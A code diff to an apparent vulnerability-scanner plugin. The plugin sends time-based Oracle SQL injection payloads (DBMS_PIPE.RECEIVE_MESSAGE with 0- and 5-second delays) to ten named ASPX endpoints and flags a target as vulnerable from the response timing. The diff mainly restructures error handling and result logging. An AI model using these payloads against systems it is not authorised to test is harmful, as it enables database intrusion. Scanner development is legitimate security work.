@@ -42,23 +42,20 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    global resp
-    global resp2
-    global time1,time2,time0
-    try:
-        urls = ['/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1',
-                    '/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1',
-                    '/Price/SuggestList.aspx?priceid=1',
-                    '/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1',
-                    '/Products/Category/CategoryOption.aspx?option=IsStop&classId=1',
-                    '/Products/Tiens/CategoryStockView.aspx?id=1',
-                    '/custom/CompanyCGList.aspx?ComId=1',
-                    '/SuperMarket/InterestInfoDetail.aspx?ItemId=1',
-                    '/Orders/k3orderdetail.aspx?FINTERID=1',
-                    '/custom/GroupNewsList.aspx?child=true&groupId=121']
-        payload1 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,0)"
-        payload2 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)"
-        for payload in urls:
+    urls = ['/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1',
+                '/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1',
+                '/Price/SuggestList.aspx?priceid=1',
+                '/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1',
+                '/Products/Category/CategoryOption.aspx?option=IsStop&classId=1',
+                '/Products/Tiens/CategoryStockView.aspx?id=1',
+                '/custom/CompanyCGList.aspx?ComId=1',
+                '/SuperMarket/InterestInfoDetail.aspx?ItemId=1',
+                '/Orders/k3orderdetail.aspx?FINTERID=1',
+                '/custom/GroupNewsList.aspx?child=true&groupId=121']
+    payload1 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,0)"
+    payload2 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)"
+    for payload in urls:
+        try:
             payload_url = scheme + "://" + url +":"+ str(port)+payload+payload1
             payload_url2 = scheme + "://" + url + ":" + str(port) + payload + payload2
 
@@ -69,21 +66,10 @@ def medusa(Url,RandomAgent,ProxyIp):
             }
 
             s = requests.session()
-            # if ProxyIp!=None:
-            #     proxies = {
-            #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-            #         "http": "http://" + str(ProxyIp)
-            #     }
-            #     time0 = time.time()
-            #     resp = s.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
-            #     time1 = time.time()
-            #     resp2 = s.get(payload_url2, headers=headers, timeout=6, proxies=proxies, verify=False)
-            #     time2 = time.time()
-            # elif ProxyIp==None:
             time0 = time.time()
             resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
             time1 = time.time()
-            resp = s.get(payload_url2, headers=headers, timeout=6, verify=False)
+            resp2 = s.get(payload_url2, headers=headers, timeout=6, verify=False)
             time2 = time.time()
             con = resp.text
             code = resp.status_code
@@ -93,7 +79,7 @@ def medusa(Url,RandomAgent,ProxyIp):
                 _t=VulnerabilityInfo(Medusa)
                 web=ClassCongregation.VulnerabilityDetails(_t.info)
                 web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
-                return (str(Medusa))
-    except Exception:
-        _ = VulnerabilityInfo('').info.get('algroup')
-        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
+                ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
+        except Exception:
+            _ = VulnerabilityInfo('').info.get('algroup')
+            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名
